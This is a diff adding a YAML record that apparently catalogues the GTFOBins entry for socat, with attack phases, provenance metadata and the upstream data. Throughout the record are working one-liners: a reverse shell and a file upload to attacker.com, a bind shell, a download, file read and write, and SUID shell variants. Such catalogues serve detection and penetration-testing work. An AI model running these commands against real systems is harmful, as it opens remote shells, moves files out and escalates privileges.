@@ -1,0 +1,124 @@
+id: gtfobins/socat/reverse-shell/unprivileged
+type: binary
+platform: linux
+name: socat
+phases:
+- execution
+- command-and-control
+capabilities:
+- reverse-shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
+references:
+- https://gtfobins.github.io/gtfobins/socat/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        socat:
+          functions:
+            bind-shell:
+            - code: socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
+              connector: tcp-client-tty
+              contexts:
+                sudo: null
+                suid:
+                  code: socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
+                  shell: false
+                unprivileged: null
+            download:
+            - code: socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: tcp-server
+            file-read:
+            - code: socat -u file:/path/to/input-file -
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: socat -u 'exec:echo DATA' open:/path/to/output-file,creat
+              comment: The `echo` command is actually used.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            reverse-shell:
+            - code: socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
+              contexts:
+                sudo: null
+                suid:
+                  code: socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
+                  shell: false
+                unprivileged: null
+              listener: tcp-server-tty
+            shell:
+            - code: socat - exec:/bin/sh,pty,ctty,raw,echo=0
+              contexts:
+                sudo: null
+                suid:
+                  code: socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
+                  shell: false
+                unprivileged: null
+            upload:
+            - code: socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: tcp-server
+    upstream_url: https://gtfobins.github.io/gtfobins/socat/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: reverse-shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:4fa8b86759168d6b8468aa3638e54fc847c9b2cb33d81588e1fadf428fa0b29a
